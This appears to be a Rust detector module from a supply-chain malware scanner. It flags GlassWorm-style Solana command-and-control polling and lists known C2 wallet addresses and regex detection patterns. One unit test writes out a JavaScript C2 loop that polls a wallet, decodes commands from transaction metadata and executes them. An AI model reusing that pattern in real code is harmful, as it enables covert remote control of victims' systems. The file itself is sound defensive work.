//! Blockchain Polling Detector (GlassWorm-specific)
//!
//! Detects GlassWorm-specific blockchain C2 polling patterns,
//! specifically Solana-based command-and-control communication.
//!
//! ## Detection Logic
//!
//! This detector emits findings when:
//! 1. getSignaturesForAddress + setInterval combination (CRITICAL - GlassWorm signature)
//! 2. Solana RPC endpoints with polling
//! 3. Transaction metadata parsing for C2 commands
//! 4. Memo instruction usage for data hiding
//!
//! ## GlassWorm C2 Mechanism
//!
//! GlassWorm uses Solana blockchain for decentralized C2:
//! 1. Poll C2 wallet every 5 minutes using getSignaturesForAddress
//! 2. Fetch transaction details with getTransaction
//! 3. Extract commands from transaction metadata/memo instructions
//! 4. Execute commands received via blockchain
//!
//! This provides resilience - no single point of failure.
//!
//! ## Severity
//!
//! Critical: getSignaturesForAddress + setInterval combination
//! Critical: Known GlassWorm C2 wallet addresses
//! High: Solana RPC endpoint + polling
//! Medium: Memo instruction usage alone

use crate::detector::{Detector, DetectorMetadata, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

/// Known GlassWorm C2 wallet addresses (from intelligence reports)
const KNOWN_C2_WALLETS: &[&str] = &[
    // GlassWorm Core
    "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",  // ForceMemo C2
    "28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2",  // Primary GlassWorm
    // ForceMemo
    "G2YxRa6wt1qePMwfJzdXZG62ej4qaTC7YURzuh2Lwd3t",  // ForceMemo funding
    // Chrome RAT (Mar 2026 reports)
    "DSRUBTziADDHSik7WQvSMjvwCHFsbsThrbbjWMoJPUiW",  // Chrome extension RAT C2
    "6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ",  // Payload delivery
];

/// Solana RPC endpoints used by GlassWorm
const SOLANA_RPC_ENDPOINTS: &[&str] = &[
    "api.mainnet-beta.solana.com",
    "solana-api.projectserum.com",
    "rpc.ankr.com/solana",
    "api.devnet.solana.com",
    "api.testnet.solana.com",
];

/// Patterns for blockchain polling detection
static POLLING_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // getSignaturesForAddress method (GlassWorm primary)
        Regex::new(r"getSignaturesForAddress\s*\(").unwrap(),
        // getTransaction method
        Regex::new(r"getTransaction\s*\(").unwrap(),
        // getParsedTransactions method
        Regex::new(r"getParsedTransactions?\s*\(").unwrap(),
        // setInterval with async callback
        Regex::new(r"setInterval\s*\(\s*async").unwrap(),
        // Connection to Solana RPC
        Regex::new(r"new\s+Connection\s*\(").unwrap(),
        // Memo instruction
        Regex::new(r"Memo(?:Instruction|Program)?").unwrap(),
        // Transaction metadata parsing
        Regex::new(r"tx\.meta(?:innerInstructions)?|transaction\.meta").unwrap(),
        // Inner instructions (GlassWorm command extraction)
        Regex::new(r"innerInstructions").unwrap(),
    ]
});

/// Detector for GlassWorm blockchain polling
pub struct BlockchainPollingDetector;

impl BlockchainPollingDetector {
    /// Create a new blockchain polling detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for BlockchainPollingDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for BlockchainPollingDetector {
    fn name(&self) -> &str {
        "blockchain_polling"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier3Behavioral
    }

    fn cost(&self) -> u8 {
        4  // Medium cost - multiple pattern matching
    }

    fn signal_strength(&self) -> u8 {
        10  // Very high signal - getSignaturesForAddress + interval is GlassWorm signature
    }

    fn prerequisites(&self) -> Vec<&'static str> {
        vec!["invisible_char", "glassware"]  // Run after Tier 1-2
    }

    fn should_run(&self, findings: &[Finding]) -> bool {
        // Don't run Tier 3 if nothing found by Tier 1-2
        !findings.is_empty()
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();
        let content = ir.content();
        let path = &ir.metadata.path;

        // Track pattern matches for correlation
        let mut has_get_signatures = false;
        let mut has_set_interval = false;
        let mut has_solana_rpc = false;
        let mut has_transaction_parsing = false;
        let mut has_memo = false;
        let mut matched_wallets: Vec<&str> = Vec::new();
        let mut first_match_line = 1;

        for (line_num, line) in content.lines().enumerate() {
            let line = line.trim();

            // Check for known C2 wallet addresses (ALWAYS flag)
            for wallet in KNOWN_C2_WALLETS {
                if line.contains(wallet) {
                    matched_wallets.push(wallet);
                    if first_match_line == 1 {
                        first_match_line = line_num + 1;
                    }

                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::BlockchainC2,
                            Severity::Critical,
                            &format!("Known GlassWorm C2 wallet address: {}", wallet),
                            "CRITICAL: Confirmed GlassWorm command-and-control wallet. \
                             This is a definitive indicator of GlassWorm infection. \
                             Immediate incident response required.",
                        )
                        .with_cwe_id("CWE-506")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.98),
                    );
                }
            }

            // Track pattern matches
            if POLLING_PATTERNS[0].is_match(line) {
                has_get_signatures = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }
            }

            if POLLING_PATTERNS[3].is_match(line) {
                has_set_interval = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }
            }

            // Check for Solana RPC endpoints
            for endpoint in SOLANA_RPC_ENDPOINTS {
                if line.contains(endpoint) {
                    has_solana_rpc = true;
                    if first_match_line == 1 {
                        first_match_line = line_num + 1;
                    }

                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::BlockchainC2,
                            Severity::High,
                            &format!("Solana RPC endpoint: {}", endpoint),
                            "Solana RPC endpoint detected. When combined with polling patterns, \
                             this indicates blockchain-based C2 communication.",
                        )
                        .with_cwe_id("CWE-506")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.75),
                    );
                }
            }

            // Check for transaction metadata parsing
            if POLLING_PATTERNS[1].is_match(line) || POLLING_PATTERNS[6].is_match(line) || POLLING_PATTERNS[7].is_match(line) {
                has_transaction_parsing = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }

                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::High,
                        "Transaction metadata parsing for C2 commands",
                        "GlassWorm extracts commands from Solana transaction metadata. \
                         Review the transaction parsing logic for command execution.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.80),
                );
            }

            // Check for memo instruction usage
            if POLLING_PATTERNS[5].is_match(line) {
                has_memo = true;
                if first_match_line == 1 {
                    first_match_line = line_num + 1;
                }

                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::Medium,
                        "Memo instruction usage (potential data hiding)",
                        "Solana memo instructions can hide C2 commands or exfiltrated data. \
                         Review memo content for encoded payloads.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.65),
                );
            }
        }

        // CRITICAL: Check for GlassWorm signature pattern
        // getSignaturesForAddress + setInterval = definitive GlassWorm C2
        if has_get_signatures && has_set_interval {
            findings.push(
                Finding::new(
                    path,
                    first_match_line,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::Critical,
                    "GlassWorm C2 polling pattern: getSignaturesForAddress + setInterval",
                    "CRITICAL: This is the definitive GlassWorm blockchain C2 signature. \
                     The code polls a Solana wallet at regular intervals to receive commands. \
                     Immediate incident response required.",
                )
                .with_cwe_id("CWE-506")
                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                .with_confidence(0.95),
            );
        }

        // High: Solana RPC + polling (even without getSignaturesForAddress)
        if has_solana_rpc && has_set_interval && !has_get_signatures {
            findings.push(
                Finding::new(
                    path,
                    first_match_line,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "Solana RPC endpoint with polling interval",
                    "Combination of Solana RPC usage and polling suggests blockchain C2. \
                     Review the polling logic for command extraction.",
                )
                .with_cwe_id("CWE-506")
                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                .with_confidence(0.82),
            );
        }

        // Correlation: transaction parsing + memo = command extraction
        if has_transaction_parsing && has_memo {
            findings.push(
                Finding::new(
                    path,
                    first_match_line,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "Transaction parsing + memo instruction (command extraction pattern)",
                    "GlassWorm extracts commands from transaction memo instructions. \
                     This pattern indicates active C2 communication.",
                )
                .with_cwe_id("CWE-506")
                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                .with_confidence(0.85),
            );
        }

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "blockchain_polling".to_string(),
            version: "1.0.0".to_string(),
            description: "Detects GlassWorm blockchain C2 polling patterns including Solana RPC usage and transaction parsing".to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UnicodeConfig;

    #[test]
    fn test_detect_glassworm_signature() {
        let detector = BlockchainPollingDetector::new();

        // GlassWorm signature: getSignaturesForAddress + setInterval
        let content = r#"
            const { Connection, PublicKey } = require('@solana/web3.js');
            
            const C2_WALLET = new PublicKey("7nE9GdcnPSzC9X5K9K4...");
            const connection = new Connection("https://api.mainnet-beta.solana.com");
            
            // Poll every 5 minutes
            setInterval(async () => {
                const signatures = await connection.getSignaturesForAddress(C2_WALLET, { limit: 1 });
                if (signatures.length > 0) {
                    const tx = await connection.getTransaction(signatures[0].signature);
                    const command = decodeCommand(tx.meta.innerInstructions);
                    executeCommand(command);
                }
            }, 300000);
        "#;

        let ir = FileIR::build(Path::new("c2.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        // Should have Critical finding for GlassWorm signature
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("getSignaturesForAddress")));
    }

    #[test]
    fn test_detect_known_wallet() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const C2_ADDRESS = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";
            const memo = await getLatestMemo(C2_ADDRESS);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].description.contains("Known GlassWorm C2 wallet"));
        assert!(findings[0].confidence.unwrap_or(0.0) >= 0.95);
    }

    #[test]
    fn test_detect_solana_rpc_polling() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const connection = new Connection("https://api.mainnet-beta.solana.com");
            
            setInterval(async () => {{
                const balance = await connection.getBalance(wallet);
                console.log('Balance:', balance);
            }}, 5000);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn test_detect_transaction_parsing() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const tx = await connection.getTransaction(signature);
            const instructions = tx.meta.innerInstructions;
            const memo = instructions.find(i => i.programId.equals(MEMO_PROGRAM_ID));
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("metadata parsing")));
    }

    #[test]
    fn test_detect_memo_instruction() {
        let detector = BlockchainPollingDetector::new();

        let content = r#"
            const {{ MemoProgram }} = require('@solana/web3.js');
            const memoInstruction = MemoProgram.createInstruction('Hello World');
            transaction.add(memoInstruction);
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("Memo instruction")));
    }

    #[test]
    fn test_no_detect_legitimate_blockchain() {
        let detector = BlockchainPollingDetector::new();

        // Legitimate blockchain usage without polling
        let content = r#"
            const {{ Connection }} = require('@solana/web3.js');
            const connection = new Connection("https://api.mainnet-beta.solana.com");
            
            // One-time balance check
            async function checkBalance() {{
                const balance = await connection.getBalance(wallet);
                return balance;
            }}
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should have minimal findings (just RPC endpoint, no Critical)
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }
}
